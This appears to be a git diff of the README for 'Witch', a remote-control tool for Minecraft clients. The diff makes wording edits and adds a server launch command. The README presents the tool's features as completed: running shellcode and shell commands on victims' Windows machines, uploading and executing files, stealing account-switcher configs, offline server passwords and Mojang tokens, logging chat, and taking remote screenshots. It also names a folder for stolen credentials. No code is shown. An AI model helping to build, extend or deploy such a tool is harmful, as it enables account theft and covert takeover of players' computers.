@@ -14,24 +14,24 @@ The Witch system controls Minecraft clients using websocket connections.
 ### System administration
 
 - [X] System information
-- [X] Execute shellcode(for Windows, 32 bit)
+- [X] Execute shellcode (for Windows, 32 bit)
 - [X] Shell commands
-- [X] File upload & Execute(for Windows)
+- [X] File upload & execute (for Windows)
 - [X] Read text files
-- [X] Run Arguments
+- [X] Get run arguments
 
 ### Social engineering
 
 - [X] [IAS](https://modrinth.com/mod/in-game-account-switcher) mod config steal
 - [X] Grab offline server passwords
 - [X] Grab Mojang user tokens
-- [X] Log chat&commands
+- [X] Log chat & commands
 
 ### Player information
 
 - [X] Remote screenshot
 - [X] Mod list
-- [X] Chat system
+- [X] Chat system (in game)
 - [X] Player info like coordinates, server, etc.
 - [X] Player skin download
 
@@ -45,12 +45,14 @@ The Witch system controls Minecraft clients using websocket connections.
 
 [Commands in MessageHandler.java](client/src/main/java/me/soda/witch/websocket/MessageHandler.java)
 
+`java -jar server.jar <port>` (Default port: 11451)
+
 #### Directories:
 
 * screenshots - Client screenshot
-* logging - Player chat&command logs
+* logging - Player chat & command logs
 * skins - Player skins
-* player - Stolen token, password, config
+* player - Stolen token, config, etc.
 
 #### Client config : [Witch.java](client/src/main/java/me/soda/witch/Witch.java)
 
